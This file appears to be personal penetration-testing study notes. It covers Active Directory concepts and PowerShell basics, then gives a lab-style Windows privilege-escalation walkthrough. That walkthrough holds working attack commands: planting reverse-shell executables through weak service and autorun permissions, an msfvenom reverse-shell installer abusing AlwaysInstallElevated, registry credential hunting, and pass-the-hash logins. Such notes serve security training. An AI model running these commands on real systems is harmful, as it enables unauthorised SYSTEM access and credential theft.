# Windows

#Active Directory Data Store
Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
Stored by default in %SystemRoot%\NTDS
accessible only by the domain controller

#Forest Overview
Trees - A hierarchy of domains in Active Directory Domain Services
Domains - Used to group and manage objects 
Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
Trusts - Allows users to access resources in other domains
Objects - users, groups, printers, computers, shares
Domain Services - DNS Server, LLMNR, IPv6
Domain Schema - Rules for object creation

#Users Overview
Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.

#Default Security Groups
Domain Controllers - All domain controllers in the domain
Domain Guests - All domain guests
Domain Users - All domain users
Domain Computers - All workstations and servers joined to the domain
Domain Admins - Designated administrators of the domain
Enterprise Admins - Designated administrators of the enterprise
Schema Admins - Designated administrators of the schema
DNS Admins - DNS Administrators Group
DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
Group Policy Creator Owners - Members in this group can modify group policy for the domain
Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
Cert Publishers - Members of this group are permitted to publish certificates to the directory
Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
Key Admins - Members of this group can perform administrative actions on key objects within the domain.
Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
RAS and IAS Servers - Servers in this group can access remote access properties of users

#Policies
Disable Windows Defender - Disables windows defender across all machine on the domain
Digitally Sign Communication (Always) - Can disable or enable SMB signing on the domain controller

#Default Domain Services
LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames

#WinServ AD vs    Azure AD
Windows Server AD	Azure AD
LDAP	            Rest APIs
NTLM	            OAuth/SAML
Kerberos	        OpenID
OU Tree	          Flat Structure
Domains/Forests 	Tenants
Trusts	          Guests

#list of all operating systems on the domain
Get-NetComputer -fulldata | select operatingsystem

#List of all users on the domain
Get-NetUser | select cn

#PowerShell
Resource: https://learnxinyminutes.com/docs/powershell/

#Using Get-Help
Get-Help Command-Name
-examples

Get-Command Verb-*
Get-Command *-Noun

The Pipeline(|) is used to pass output from one cmdlet to another. A major difference compared to other shells is that instead of passing text or string to the command after the pipe, powershell passes an object to the next cmdlet. Like every object in object oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdlet

#Object Manipulation
Verb-Noun | Get-Member 
An example of running this to view the members for Get-Command is:
Get-Command | Get-Member -MemberType Method
One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using Select-Object

an example of listing the directories and just selecting the mode and the name:
![image](https://user-images.githubusercontent.com/113439757/213785676-a2d2e19e-6d7b-4e17-bef7-103d3ddfd22b.png)
You can also use the following flags to select particular information:
first - gets the first x object
last - gets the last x object
unique - shows the unique objects
skip - skips x objects

#Filtering Objects
Verb-Noun | Where-Object -Property PropertyName -operator Value
Verb-Noun | Where-Object {$_.PropertyName -operator Value}
The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.
Where -operator is a list of the following operators:
-Contains: if any item in the property value is an exact match for the specified value
-EQ: if the property value is the same as the specified value
-GT: if the property value is greater than the specified value
Full list of operators
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.3&viewFallbackFrom=powershell-6

#Sort Objects
Verb-Noun | Sort-Object

#IP address info
Get-NetIPAddress

#Sysinternals
#Insecure Service Permissions with Accesschk
#Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
#Query the service
sc qc daclsvc
#start the service 
net start daclsvc

#Unquoted service path
Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.
sc qc unquotedsvc
Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
Copy the reverse.exe executable you created to this directory and rename it Common.exe:
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
net start unquotedsvc

#Weak registry permissions
##Query the "regsvc" service
sc qc regsvc
#note if the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

#Service Exploits
#Query the "filepermsvc" service
sc qc filepermsvc
Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
net start filepermsvc

#Autoruns
Query the registry for AutoRun executables:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!
rdesktop MACHINE_IP

#AlwaysInstallElevated
Query the registry for AlwaysInstallElevated keys:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Note that both keys are set to 1 (0x1).
On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

#Passwords
The registry can be searched for keys and values that contain the word "password":
reg query HKLM /f password /t REG_SZ /s
If you want to save some time, query this specific key to find admin AutoLogon credentials:
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
winexe -U 'admin%password' //MACHINE_IP cmd.exe

#List any saved credentials:
cmdkey /list

#Pass the hash
Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:
pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe

#Insecure GUI apps
tasklist /V | findstr calc.exe
click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
Press Enter to spawn a command prompt running with admin privileges

#Priv esc program resources
winPEASany.exe
Seatbelt.exe
PowerUp.ps1
SharpUp.exe
